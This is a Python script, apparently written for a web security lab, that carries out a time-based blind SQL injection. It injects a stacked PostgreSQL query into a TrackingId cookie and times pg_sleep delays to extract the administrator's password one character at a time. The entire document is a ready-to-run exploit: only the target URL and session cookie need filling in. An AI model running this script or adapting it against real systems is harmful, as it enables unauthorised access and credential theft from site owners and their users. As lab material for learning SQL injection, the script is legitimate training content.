import requests
import time

URL = "CHANGE_ME"
SESSION_COOKIE = "CHANGE_ME"
TRACKING_ID = "CHANGE_ME"
PASSWORD_LENGTH = 20
CHARS = "abcdefghijklmnopqrstuvwxyz0123456789"

def check_char(position, char):
    payload = (f"{TRACKING_ID}'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{position},1)='{char}') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--")
    cookies = {"TrackingId": payload, "session": SESSION_COOKIE}
    start = time.time()
    requests.get(URL, cookies=cookies)
    return time.time() - start > 2.5

def extract_password():
    password = ""
    for position in range(1, PASSWORD_LENGTH + 1):
        for char in CHARS:
            print(f"[*] Position {position}: trying '{char}'", end="\r")
            if check_char(position, char):
                password += char
                print(f"[+] Position {position}: '{char}' ✓")
                break
    return password

if __name__ == "__main__":
    password = extract_password()
    print(f"\n[+] Password: {password}")
